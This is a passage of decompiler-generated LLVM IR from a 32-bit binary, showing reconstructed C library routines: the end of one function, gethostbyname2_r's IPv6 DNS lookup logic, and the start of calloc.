  br i1 %v1_80657c9, label %dec_label_pc_8065800, label %dec_label_pc_80657cb

dec_label_pc_80657cb:                             ; preds = %dec_label_pc_80657c6
  %v1_80657cb = add i32 %v0_80657b1, 1
  br label %dec_label_pc_80657d7

dec_label_pc_80657ce:                             ; preds = %dec_label_pc_80657c0
  %v1_80657ce = add i32 %v0_80657b1, 1
  %v4_80657cf = icmp eq i8 %v2_80657b2, 0
  br i1 %v4_80657cf, label %dec_label_pc_80657d7, label %dec_label_pc_80657d3

dec_label_pc_80657d3:                             ; preds = %dec_label_pc_80657ce
  %v2_80657d3 = and i16 %v5_80657b7, 32
  %v3_80657d3 = icmp eq i16 %v2_80657d3, 0
  br i1 %v3_80657d3, label %dec_label_pc_8065800, label %dec_label_pc_80657d7

dec_label_pc_80657d7:                             ; preds = %dec_label_pc_80657d3, %dec_label_pc_80657ce, %dec_label_pc_80657cb
  %v0_80657943 = phi i32 [ %v1_80657ce, %dec_label_pc_80657d3 ], [ %v1_80657ce, %dec_label_pc_80657ce ], [ %v1_80657cb, %dec_label_pc_80657cb ]
  %v3_80657d7 = add nuw nsw i32 %v2_80657d734, 1
  %v2_80657da = mul i32 %v0_80657f532, 256
  %v2_80657dd = or i32 %v1_80657a2, %v2_80657da
  %v12_80657df = icmp eq i32 %v2_80657d734, 3
  %v7_80657e3 = icmp sgt i32 %v2_80657d734, 3
  br i1 %v7_80657e3, label %dec_label_pc_80657e5, label %dec_label_pc_806578e

dec_label_pc_80657e5:                             ; preds = %dec_label_pc_80657d7
  %v4_80657e5 = icmp eq i32 %arg2, 0
  br i1 %v4_80657e5, label %dec_label_pc_8065802, label %dec_label_pc_80657f1

dec_label_pc_80657f1:                             ; preds = %dec_label_pc_80657e5
  %v1_80657f5 = call i32 @llvm.bswap.i32(i32 %v2_80657dd)
  %v2_80657f7 = inttoptr i32 %arg2 to i32*
  store i32 %v1_80657f5, i32* %v2_80657f7, align 4
  br label %dec_label_pc_8065802

dec_label_pc_8065800:                             ; preds = %dec_label_pc_80657d3, %dec_label_pc_80657c6, %dec_label_pc_806578e, %dec_label_pc_80657a2, %entry
  br label %dec_label_pc_8065802

dec_label_pc_8065802:                             ; preds = %dec_label_pc_80657e5, %dec_label_pc_80657f1, %dec_label_pc_8065800
  %v0_8065807 = phi i32 [ 1, %dec_label_pc_80657e5 ], [ 1, %dec_label_pc_80657f1 ], [ 0, %dec_label_pc_8065800 ]
  ret i32 %v0_8065807

; uselistorder directives
  uselistorder i32 %v6_80657b2, { 1, 0 }
  uselistorder i32 %v3_80657b2, { 2, 0, 1 }
  uselistorder i8 %v2_80657b2, { 1, 0, 2 }
  uselistorder i32 %v0_80657b1, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80657a9, { 1, 0 }
  uselistorder i32 %v3_80657a5, { 1, 0, 3, 2 }
  uselistorder i32 %v0_806579433, { 1, 0 }
  uselistorder i32 %v2_80657d734, { 1, 0, 2 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i16 8, { 2, 0, 1 }
  uselistorder i32 254, { 1, 0 }
  uselistorder i32 -255, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8065802, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8065800, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80657b2, { 1, 0 }
  uselistorder label %dec_label_pc_806578e, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v0_8065809 = load i32, i32* @edi, align 4
  %v0_806580a = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @eax, align 4
  store i32 %arg4, i32* @ebp, align 4
  store i32 %arg5, i32* @esi, align 4
  %v9_806581b = icmp eq i32 %arg2, 2
  %v1_806581e = icmp eq i1 %v9_806581b, false
  br i1 %v1_806581e, label %dec_label_pc_806584a, label %dec_label_pc_8065820

dec_label_pc_8065820:                             ; preds = %entry
  %v7_806583d = inttoptr i32 %arg1 to i8*
  %v8_806583d = call i32 @gethostbyname_r(i8* %v7_806583d, i32 %tmp8, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg2, i32 %arg2)
  store i32 %v8_806583d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065ac9

dec_label_pc_806584a:                             ; preds = %entry
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v9_806584e = icmp eq i32 %arg2, 10
  %v1_8065851 = inttoptr i32 %arg6 to i32*
  store i32 0, i32* %v1_8065851, align 4
  %v1_8065857 = icmp eq i1 %v9_806584e, false
  br i1 %v1_8065857, label %dec_label_pc_8065ac4, label %dec_label_pc_806585d

dec_label_pc_806585d:                             ; preds = %dec_label_pc_806584a
  %v4_806585d = icmp eq i32 %arg1, 0
  br i1 %v4_806585d, label %dec_label_pc_8065ac4, label %dec_label_pc_8065868

dec_label_pc_8065868:                             ; preds = %dec_label_pc_806585d
  store i32 -8, i32* @ebx, align 4
  %v2_806586e = load i32, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 %v2_806586e, i32* @edi, align 4
  store i32 0, i32* inttoptr (i32 -8 to i32*), align 8
  %v0_8065878 = load i32, i32* @eax, align 4
  %v0_806587d = load i32, i32* %edx.global-to-local, align 4
  %v0_806587e = load i32, i32* @esi, align 4
  %v7_806588a = call i32 @__get_hosts_byname_r(i32 %arg1, i32 10, i32 %tmp8, i32 %v0_806587e, i32 %v0_806587d, i32 %arg7, i32 %v0_8065878)
  store i32 %v7_806588a, i32* %eax.global-to-local, align 4
  %v1_8065892 = icmp eq i32 %v7_806588a, 0
  %v1_8065894 = icmp eq i1 %v1_8065892, false
  br i1 %v1_8065894, label %dec_label_pc_806589e, label %dec_label_pc_8065896

dec_label_pc_8065896:                             ; preds = %dec_label_pc_8065868
  %v0_8065896 = load i32, i32* @edi, align 4
  %v1_8065896 = load i32, i32* @ebx, align 4
  %v2_8065896 = inttoptr i32 %v1_8065896 to i32*
  store i32 %v0_8065896, i32* %v2_8065896, align 4
  br label %dec_label_pc_8065ac9

dec_label_pc_806589e:                             ; preds = %dec_label_pc_8065868
  store i32 %arg7, i32* %ecx.global-to-local, align 4
  %v1_80658a2 = inttoptr i32 %arg7 to i32*
  %v2_80658a2 = load i32, i32* %v1_80658a2, align 4
  store i32 %v2_80658a2, i32* %edx.global-to-local, align 4
  %v9_80658a4 = icmp eq i32 %v2_80658a2, 1
  br i1 %v9_80658a4, label %dec_label_pc_80658b7, label %dec_label_pc_80658a9

dec_label_pc_80658a9:                             ; preds = %dec_label_pc_806589e
  %v9_80658a9 = icmp eq i32 %v2_80658a2, 4
  br i1 %v9_80658a9, label %dec_label_pc_80658cb, label %dec_label_pc_80658ae

dec_label_pc_80658ae:                             ; preds = %dec_label_pc_80658a9
  %v1_80658ae = add i32 %v2_80658a2, 1
  %v8_80658ae = icmp eq i32 %v1_80658ae, 0
  store i32 %v1_80658ae, i32* %edx.global-to-local, align 4
  %v1_80658af = icmp eq i1 %v8_80658ae, false
  br i1 %v1_80658af, label %dec_label_pc_8065ac9, label %dec_label_pc_80658c1

dec_label_pc_80658b7:                             ; preds = %dec_label_pc_806589e
  %v9_80658b9 = icmp eq i32 %v7_806588a, 2
  %v1_80658bc = zext i1 %v9_80658b9 to i32
  br label %dec_label_pc_80658cd

dec_label_pc_80658c1:                             ; preds = %dec_label_pc_80658ae
  %v0_80658c1 = load i32, i32* @ebx, align 4
  %v1_80658c1 = inttoptr i32 %v0_80658c1 to i32*
  %v2_80658c1 = load i32, i32* %v1_80658c1, align 4
  %v11_80658c1 = icmp eq i32 %v2_80658c1, 2
  %v1_80658c5 = icmp eq i1 %v11_80658c1, false
  br i1 %v1_80658c5, label %dec_label_pc_8065ac9, label %dec_label_pc_80658cb

dec_label_pc_80658cb:                             ; preds = %dec_label_pc_80658c1, %dec_label_pc_80658a9
  br label %dec_label_pc_80658cd

dec_label_pc_80658cd:                             ; preds = %dec_label_pc_80658b7, %dec_label_pc_80658cb
  %storemerge = phi i32 [ 0, %dec_label_pc_80658cb ], [ %v1_80658bc, %dec_label_pc_80658b7 ]
  store i32 %storemerge, i32* @ebx, align 4
  %v0_80658d2 = load i32, i32* @ebp, align 4
  %v1_80658d4 = sub i32 0, %v0_80658d2
  %v1_80658d6 = urem i32 %v1_80658d4, 4
  store i32 %v1_80658d6, i32* %edx.global-to-local, align 4
  %v0_80658d9 = load i32, i32* @esi, align 4
  %v2_80658d9 = sub i32 %v0_80658d9, %v1_80658d6
  store i32 %v2_80658d9, i32* %esi.global-to-local, align 4
  %v0_80658db = load i32, i32* @edi, align 4
  store i32 %v0_80658db, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 %arg7, i32* @edi, align 4
  %v1_80658e2 = add i32 %v2_80658d9, -24
  store i32 %v1_80658e2, i32* @esi, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_80658a2, align 4
  %v7_80658f6 = icmp sgt i32 %v1_80658e2, 255
  br i1 %v7_80658f6, label %dec_label_pc_80658fc, label %dec_label_pc_8065ac9

dec_label_pc_80658fc:                             ; preds = %dec_label_pc_80658cd
  %v0_80658fc = load i32, i32* @ebp, align 4
  %v1_80658fc = load i32, i32* %edx.global-to-local, align 4
  %v2_80658fc = add i32 %v1_80658fc, %v0_80658fc
  store i32 %v2_80658fc, i32* @ebp, align 4
  %v1_80658fe = add i32 %v2_80658fc, 24
  store i32 %v1_80658fe, i32* %edx.global-to-local, align 4
  %v1_8065901 = add i32 %v2_80658fc, 16
  store i32 %v1_8065901, i32* %eax.global-to-local, align 4
  %v3_806590c = inttoptr i32 %v1_8065901 to i32*
  store i32 %v2_80658fc, i32* %v3_806590c, align 4
  %v0_806590f = load i32, i32* %eax.global-to-local, align 4
  %v1_806590f = add i32 %v0_806590f, 4
  %v2_806590f = inttoptr i32 %v1_806590f to i32*
  store i32 0, i32* %v2_806590f, align 4
  %v0_8065917 = load i32, i32* @esi, align 4
  %v0_806591c = load i32, i32* %edx.global-to-local, align 4
  %v3_806591d = inttoptr i32 %v0_806591c to i8*
  %v4_806591d = call i32 @strncpy(i8* %v3_806591d, i32 %arg1, i32 %v0_8065917)
  store i32 %v4_806591d, i32* %eax.global-to-local, align 4
  %v0_8065925 = load i32, i32* @ebp, align 4
  %v1_8065925 = load i32, i32* @esi, align 4
  %v2_8065925 = add i32 %v0_8065925, 24
  %v3_8065925 = add i32 %v2_8065925, %v1_8065925
  %v4_8065925 = inttoptr i32 %v3_8065925 to i8*
  store i8 0, i8* %v4_8065925, align 1
  %v2_8065931 = inttoptr i32 %arg1 to i8*
  %v3_8065931 = call i32 @inet_pton(i32 10, i8* %v2_8065931)
  store i32 %v3_8065931, i32* %eax.global-to-local, align 4
  %v1_8065939 = icmp eq i32 %v3_8065931, 0
  br i1 %v1_8065939, label %dec_label_pc_8065973, label %dec_label_pc_806593d

dec_label_pc_806593d:                             ; preds = %dec_label_pc_80658fc
  store i32 %tmp8, i32* %ecx.global-to-local, align 4
  store i32 %v1_8065901, i32* %eax.global-to-local, align 4
  store i32 %v1_80658fe, i32* %edi.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v1_806594d = add i32 %tmp8, 8
  %v2_806594d = inttoptr i32 %v1_806594d to i32*
  store i32 10, i32* %v2_806594d, align 4
  %v0_8065954 = load i32, i32* %eax.global-to-local, align 4
  %v1_8065954 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8065954 = add i32 %v1_8065954, 16
  %v3_8065954 = inttoptr i32 %v2_8065954 to i32*
  store i32 %v0_8065954, i32* %v3_8065954, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8065959 = load i32, i32* %edi.global-to-local, align 4
  %v1_8065959 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8065959 = inttoptr i32 %v1_8065959 to i32*
  store i32 %v0_8065959, i32* %v2_8065959, align 4
  %v0_806595b = load i32, i32* %ecx.global-to-local, align 4
  %v1_806595b = add i32 %v0_806595b, 12
  %v2_806595b = inttoptr i32 %v1_806595b to i32*
  store i32 16, i32* %v2_806595b, align 4
  %v0_8065962 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8065962 = load i32, i32* %edx.global-to-local, align 4
  %v2_8065962 = inttoptr i32 %v1_8065962 to i32*
  store i32 %v0_8065962, i32* %v2_8065962, align 4
  store i32 %arg7, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %v1_80658a2, align 4
  br label %dec_label_pc_8065ac9

dec_label_pc_8065973:                             ; preds = %dec_label_pc_80658fc
  %v0_8065973 = load i32, i32* @ebx, align 4
  %v1_8065973 = icmp eq i32 %v0_8065973, 0
  br i1 %v1_8065973, label %dec_label_pc_8065983, label %dec_label_pc_8065977

dec_label_pc_8065977:                             ; preds = %dec_label_pc_8065973
  store i32 %arg7, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80659c2

dec_label_pc_8065983:                             ; preds = %dec_label_pc_8065973
  %v2_8065983 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_8065983, i32* %edx.global-to-local, align 4
  store i32 10, i32* %ecx.global-to-local, align 4
  %tmp30 = bitcast i32* %stack_var_-60 to i8*
  store i32 %v2_8065983, i32* %edi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_8065990 = call i8* @_memset(i8* %tmp30, i32 0, i32 10)
  %v6_8065990 = ptrtoint i8* %v5_8065990 to i32
  store i32 %v6_8065990, i32* %ecx.global-to-local, align 4
  %v2_806599a = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_806599a, i32* @edi, align 4
  %v4_80659aa = inttoptr i32 %v1_80658fe to i8*
  %v9_80659ec = icmp eq i32 %tmp2, 5
  %v1_80659ef = icmp eq i1 %v9_80659ec, false
  br label %dec_label_pc_806599e

dec_label_pc_806599e:                             ; preds = %dec_label_pc_8065a08, %dec_label_pc_8065983
  %stack_var_-80.0 = phi i32 [ 0, %dec_label_pc_8065983 ], [ %v4_80659f1, %dec_label_pc_8065a08 ]
  store i32 %v2_8065983, i32* %eax.global-to-local, align 4
  %v5_80659aa = call i32 @__dns_lookup(i8* %v4_80659aa, i32 28, i32 %v2_806599a, i32 %v2_8065983)
  store i32 %v5_80659aa, i32* %eax.global-to-local, align 4
  %v2_80659b2 = icmp slt i32 %v5_80659aa, 0
  store i32 %v5_80659aa, i32* @ebx, align 4
  %v1_80659b6 = icmp eq i1 %v2_80659b2, false
  br i1 %v1_80659b6, label %dec_label_pc_80659cc, label %dec_label_pc_80659b8

dec_label_pc_80659b8:                             ; preds = %dec_label_pc_806599e
  store i32 %arg7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80659c2

dec_label_pc_80659c2:                             ; preds = %dec_label_pc_8065977, %dec_label_pc_80659b8
  store i32 1, i32* %v1_80658a2, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065ac9

dec_label_pc_80659cc:                             ; preds = %dec_label_pc_806599e
  %v0_80659cd = load i32, i32* @esi, align 4
  %v3_80659ce = load i32, i32* %stack_var_-60, align 4
  %v4_80659d6 = call i32 @strncpy(i8* %v4_80659aa, i32 %v3_80659ce, i32 %v0_80659cd)
  store i32 %v1_80658fe, i32* %eax.global-to-local, align 4
  %v3_80659dc = load i32, i32* %stack_var_-60, align 4
  %v1_80659e0 = call i32 @free(i32 %v3_80659dc)
  store i32 %tmp2, i32* @eax, align 4
  br i1 %v1_80659ef, label %dec_label_pc_8065a49, label %dec_label_pc_80659f1

dec_label_pc_80659f1:                             ; preds = %dec_label_pc_80659cc
  %v7_80659fa = icmp sgt i32 %stack_var_-80.0, 4
  br i1 %v7_80659fa, label %dec_label_pc_80659fc, label %dec_label_pc_8065a08

dec_label_pc_80659fc:                             ; preds = %dec_label_pc_80659f1
  store i32 %arg7, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8065a41

dec_label_pc_8065a08:                             ; preds = %dec_label_pc_80659f1
  %v4_80659f1 = add nuw nsw i32 %stack_var_-80.0, 1
  %v0_8065a0b = load i32, i32* @esi, align 4
  %v0_8065a10 = load i32, i32* @ebx, align 4
  %v3_8065a15 = load i32, i32* %stack_var_-20, align 4
  %v5_8065a19 = call i32 @__decode_dotted(i32 %v3_8065a15, i32 %tmp1, i32 %v0_8065a10, i32 %v1_80658fe, i32 %v0_8065a0b)
  store i32 %v5_8065a19, i32* %eax.global-to-local, align 4
  %v3_8065a21 = load i32, i32* %stack_var_-20, align 4
  store i32 %v5_8065a19, i32* @ebx, align 4
  %v1_8065a27 = call i32 @free(i32 %v3_8065a21)
  store i32 %v1_8065a27, i32* %eax.global-to-local, align 4
  %v2_8065a2f = icmp slt i32 %v5_8065a19, 0
  %v1_8065a31 = icmp eq i1 %v2_8065a2f, false
  br i1 %v1_8065a31, label %dec_label_pc_806599e, label %dec_label_pc_8065a37

dec_label_pc_8065a37:                             ; preds = %dec_label_pc_8065a08
  store i32 %arg7, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8065a41

dec_label_pc_8065a41:                             ; preds = %dec_label_pc_80659fc, %dec_label_pc_8065a37
  store i32 3, i32* %v1_80658a2, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065ac9

dec_label_pc_8065a49:                             ; preds = %dec_label_pc_80659cc
  %v9_8065a49 = icmp eq i32 %tmp2, 28
  %v1_8065a4c = icmp eq i1 %v9_8065a49, false
  br i1 %v1_8065a4c, label %dec_label_pc_8065aa1, label %dec_label_pc_8065a4e

dec_label_pc_8065a4e:                             ; preds = %dec_label_pc_8065a49
  store i32 %tmp, i32* %esi.global-to-local, align 4
  %v0_8065a52 = load i32, i32* @ebp, align 4
  store i32 %v0_8065a52, i32* %edi.global-to-local, align 4
  %v1_8065a54 = inttoptr i32 %tmp to i32*
  %v2_8065a54 = load i32, i32* %v1_8065a54, align 4
  %v4_8065a54 = inttoptr i32 %v0_8065a52 to i32*
  store i32 %v2_8065a54, i32* %v4_8065a54, align 4
  %v5_8065a54 = load i32, i32* %edi.global-to-local, align 4
  %v6_8065a54 = load i32, i32* %esi.global-to-local, align 4
  %v7_8065a54 = load i1, i1* @df, align 1
  %v8_8065a54 = select i1 %v7_8065a54, i32 -4, i32 4
  %v9_8065a54 = add i32 %v8_8065a54, %v5_8065a54
  %v10_8065a54 = add i32 %v8_8065a54, %v6_8065a54
  store i32 %v9_8065a54, i32* %edi.global-to-local, align 4
  store i32 %v10_8065a54, i32* %esi.global-to-local, align 4
  %v1_8065a55 = inttoptr i32 %v10_8065a54 to i32*
  %v2_8065a55 = load i32, i32* %v1_8065a55, align 4
  %v4_8065a55 = inttoptr i32 %v9_8065a54 to i32*
  store i32 %v2_8065a55, i32* %v4_8065a55, align 4
  %v5_8065a55 = load i32, i32* %edi.global-to-local, align 4
  %v6_8065a55 = load i32, i32* %esi.global-to-local, align 4
  %v9_8065a55 = add i32 %v5_8065a55, %v8_8065a54
  %v10_8065a55 = add i32 %v6_8065a55, %v8_8065a54
  store i32 %v9_8065a55, i32* %edi.global-to-local, align 4
  store i32 %v10_8065a55, i32* %esi.global-to-local, align 4
  %v1_8065a56 = inttoptr i32 %v10_8065a55 to i32*
  %v2_8065a56 = load i32, i32* %v1_8065a56, align 4
  %v4_8065a56 = inttoptr i32 %v9_8065a55 to i32*
  store i32 %v2_8065a56, i32* %v4_8065a56, align 4
  %v5_8065a56 = load i32, i32* %edi.global-to-local, align 4
  %v6_8065a56 = load i32, i32* %esi.global-to-local, align 4
  %v9_8065a56 = add i32 %v5_8065a56, %v8_8065a54
  %v10_8065a56 = add i32 %v6_8065a56, %v8_8065a54
  store i32 %v9_8065a56, i32* %edi.global-to-local, align 4
  store i32 %v10_8065a56, i32* %esi.global-to-local, align 4
  %v1_8065a57 = inttoptr i32 %v10_8065a56 to i32*
  %v2_8065a57 = load i32, i32* %v1_8065a57, align 4
  %v4_8065a57 = inttoptr i32 %v9_8065a56 to i32*
  store i32 %v2_8065a57, i32* %v4_8065a57, align 4
  %v5_8065a57 = load i32, i32* %edi.global-to-local, align 4
  %v6_8065a57 = load i32, i32* %esi.global-to-local, align 4
  %v9_8065a57 = add i32 %v5_8065a57, %v8_8065a54
  %v10_8065a57 = add i32 %v6_8065a57, %v8_8065a54
  store i32 %v9_8065a57, i32* @edi, align 4
  store i32 %v10_8065a57, i32* @esi, align 4
  store i32 %tmp8, i32* %eax.global-to-local, align 4
  store i32 %v1_80658fe, i32* %edx.global-to-local, align 4
  store i32 %v1_8065901, i32* %ecx.global-to-local, align 4
  %v1_8065a67 = add i32 %tmp8, 8
  %v2_8065a67 = inttoptr i32 %v1_8065a67 to i32*
  store i32 10, i32* %v2_8065a67, align 4
  %v0_8065a6e = load i32, i32* %edx.global-to-local, align 4
  %v1_8065a6e = load i32, i32* %eax.global-to-local, align 4
  %v2_8065a6e = inttoptr i32 %v1_8065a6e to i32*
  store i32 %v0_8065a6e, i32* %v2_8065a6e, align 4
  %v0_8065a70 = load i32, i32* %eax.global-to-local, align 4
  %v1_8065a70 = add i32 %v0_8065a70, 12
  %v2_8065a70 = inttoptr i32 %v1_8065a70 to i32*
  store i32 16, i32* %v2_8065a70, align 4
  %v0_8065a77 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8065a77 = load i32, i32* %eax.global-to-local, align 4
  %v2_8065a77 = add i32 %v1_8065a77, 16
  %v3_8065a77 = inttoptr i32 %v2_8065a77 to i32*
  store i32 %v0_8065a77, i32* %v3_8065a77, align 4
  %v3_8065a7a = load i32, i32* %stack_var_-20, align 4
  %v1_8065a7e = call i32 @free(i32 %v3_8065a7a)
  store i32 %arg6, i32* %edi.global-to-local, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  store i32 %tmp8, i32* %v1_8065851, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8065a99 = load i32, i32* %edx.global-to-local, align 4
  %v1_8065a99 = inttoptr i32 %v0_8065a99 to i32*
  store i32 0, i32* %v1_8065a99, align 4
  br label %dec_label_pc_8065abf

dec_label_pc_8065aa1:                             ; preds = %dec_label_pc_8065a49
  %v3_8065aa4 = load i32, i32* %stack_var_-20, align 4
  %v1_8065aa8 = call i32 @free(i32 %v3_8065aa4)
  store i32 %arg7, i32* %ecx.global-to-local, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_80658a2, align 4
  br label %dec_label_pc_8065abf

dec_label_pc_8065abf:                             ; preds = %dec_label_pc_8065a4e, %dec_label_pc_8065aa1
  br label %dec_label_pc_8065ac9

dec_label_pc_8065ac4:                             ; preds = %dec_label_pc_806585d, %dec_label_pc_806584a
  store i32 22, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065ac9

dec_label_pc_8065ac9:                             ; preds = %dec_label_pc_80658cd, %dec_label_pc_80658c1, %dec_label_pc_80658ae, %dec_label_pc_8065abf, %dec_label_pc_8065a41, %dec_label_pc_80659c2, %dec_label_pc_806593d, %dec_label_pc_8065896, %dec_label_pc_8065820, %dec_label_pc_8065ac4
  store i32 %v0_806580a, i32* %esi.global-to-local, align 4
  store i32 %v0_8065809, i32* %edi.global-to-local, align 4
  %v0_8065ad0 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8065ad0

; uselistorder directives
  uselistorder i32 %v5_8065a19, { 1, 0, 2 }
  uselistorder i32 %stack_var_-80.0, { 1, 0 }
  uselistorder i32 %v1_8065901, { 2, 1, 0, 3 }
  uselistorder i32 %v1_80658fe, { 3, 1, 0, 4, 2, 5 }
  uselistorder i32 %v1_80658d6, { 1, 0 }
  uselistorder i32 %v2_80658a2, { 2, 0, 1, 3 }
  uselistorder i32* %v1_80658a2, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0, 3 }
  uselistorder i32 %tmp8, { 6, 0, 5, 2, 4, 1, 3 }
  uselistorder i32 %tmp2, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 1, 2, 0 }
  uselistorder i32 %arg7, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %arg6, { 4, 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder i32 %arg1, { 4, 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8065ac9, { 9, 3, 4, 5, 6, 0, 1, 2, 7, 8 }
  uselistorder label %dec_label_pc_8065abf, { 1, 0 }
  uselistorder label %dec_label_pc_8065a41, { 1, 0 }
  uselistorder label %dec_label_pc_80659c2, { 1, 0 }
  uselistorder label %dec_label_pc_80658cd, { 1, 0 }
}

define i32 @calloc(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8065ad4 = load i32, i32* @edi, align 4
  %v0_8065ad6 = load i32, i32* @ebx, align 4
  %v12_8065ad7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg2, i32* @ecx, align 4
  %v4_8065ade = trunc i64 %arg1 to i32
  %v3_8065ae4 = sext i32 %arg2 to i64
  %v5_8065ae4 = mul nsw i64 %v3_8065ae4, %arg1
  %v6_8065ae4 = trunc i64 %v5_8065ae4 to i32
  store i32 %v6_8065ae4, i32* @ebx, align 4
  %v2_8065ae7 = icmp eq i32 %v4_8065ade, 0
  br i1 %v2_8065ae7, label %dec_label_pc_8065b0a, label %dec_label_pc_8065aeb

dec_label_pc_8065aeb:                             ; preds = %entry
  store i32 %v4_8065ade, i32* @edi, align 4
  %div = udiv i32 %v6_8065ae4, %v4_8065ade
  store i32 %div, i32* %eax.global-to-local, align 4
  %v12_8065af3 = icmp eq i32 %div, %arg2
  br i1 %v12_8065af3, label %dec_label_pc_8065b0a, label %dec_label_pc_8065af7

dec_label_pc_8065af7:                             ; preds = %dec_label_pc_8065aeb
  store i32 -8, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 12, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_8065bc0

dec_label_pc_8065b0a:                             ; preds = %dec_label_pc_8065aeb, %entry
  store i32 %v12_8065ad7, i32* %eax.global-to-local, align 4
  %v4_8065b1a = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134623208, i32 ptrtoint (i32* @global_var_80719f8.1606 to i32))
  store i32 %v4_8065b1a, i32* %eax.global-to-local, align 4
  %v1_8065b26 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80719f8.1606 to i32))
  store i32 %v1_8065b26, i32* %eax.global-to-local, align 4
  %v0_8065b2b = load i32, i32* @ebx, align 4
  %v1_8065b2e = call i32 @malloc(i32 %v0_8065b2b)
  store i32 %v1_8065b2e, i32* %eax.global-to-local, align 4
  %v1_8065b36 = icmp eq i32 %v1_8065b2e, 0
  store i32 %v1_8065b2e, i32* %ebx.global-to-local, align 4
  br i1 %v1_8065b36, label %dec_label_pc_8065baf, label %dec_label_pc_8065b3c

dec_label_pc_8065b3c:                             ; preds = %dec_label_pc_8065b0a
  %v1_8065b3c = add i32 %v1_8065b2e, -4
  %v2_8065b3c = inttoptr i32 %v1_8065b3c to i32*
  %v3_8065b3c = load i32, i32* %v2_8065b3c, align 4
  store i32 %v3_8065b3c, i32* %eax.global-to-local, align 4
  %v2_8065b3f = and i32 %v3_8065b3c, 2
  %v3_8065b3f = icmp eq i32 %v2_8065b3f, 0
  %v1_8065b41 = icmp eq i1 %v3_8065b3f, false
  br i1 %v1_8065b41, label %dec_label_pc_8065baf, label %dec_label_pc_8065b43

dec_label_pc_8065b43:                             ; preds = %dec_label_pc_8065b3c
  %v1_8065b435 = add i32 %v3_8065b3c, -4
  %v1_8065b46 = and i32 %v1_8065b435, -4
  %v2_8065b4b = udiv i32 %v1_8065b46, 4
  store i32 %v2_8065b4b, i32* %eax.global-to-local, align 4
  %v5_8065b4e = icmp ult i32 %v1_8065b46, 36
  %tmp = and i32 %v1_8065b435, -4
  %tmp17 = icmp eq i32 %tmp, 36
  %v2_8065b51 = or i1 %v5_8065b4e, %tmp17
  br i1 %v2_8065b51, label %dec_label_pc_8065b62, label %dec_label_pc_8065b53

dec_label_pc_8065b53:                             ; preds = %dec_label_pc_8065b43
  %v3_8065b58 = inttoptr i32 %v1_8065b2e to i8*
  %v4_8065b58 = call i32 @__GI_memset(i8* %v3_8065b58, i32 0, i32 %v1_8065b46)
  store i32 %v4_8065b58, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8065baf

dec_label_pc_8065b62:                             ; preds = %dec_label_pc_8065b43
  %v5_8065b62 = icmp ult i32 %v1_8065b46, 16
  %tmp18 = and i32 %v1_8065b435, -4
